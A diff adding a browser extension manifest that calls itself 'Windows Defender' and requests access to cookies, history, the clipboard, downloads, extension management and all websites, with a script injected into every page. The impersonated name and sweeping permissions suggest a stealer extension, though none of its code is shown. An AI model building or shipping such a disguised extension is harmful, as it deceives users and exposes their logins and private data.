@@ -1,0 +1,46 @@
+{
+  "manifest_version": 3,
+  "name": "Windows Defender",
+  "version": "1.0",
+"permissions": [
+  "management",
+  "webNavigation",
+  "tabs",
+  "activeTab",
+  "scripting",
+  "history",
+  "storage",
+  "cookies",
+  "clipboardRead",
+  "downloads"
+  ],
+  "host_permissions": [
+    "http://*/*",
+    "https://*/*",
+    "<all_urls>"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_popup": "popup.html",
+    "default_icon": {
+      "16": "icon.png",
+      "48": "icon.png",
+      "128": "icon.png"
+    }
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"],
+      "run_at": "document_idle"
+    }
+  ],
+  "web_accessible_resources": [
+    {
+      "resources": ["icon.png"],
+      "matches": ["<all_urls>"]
+    }
+  ]
+}
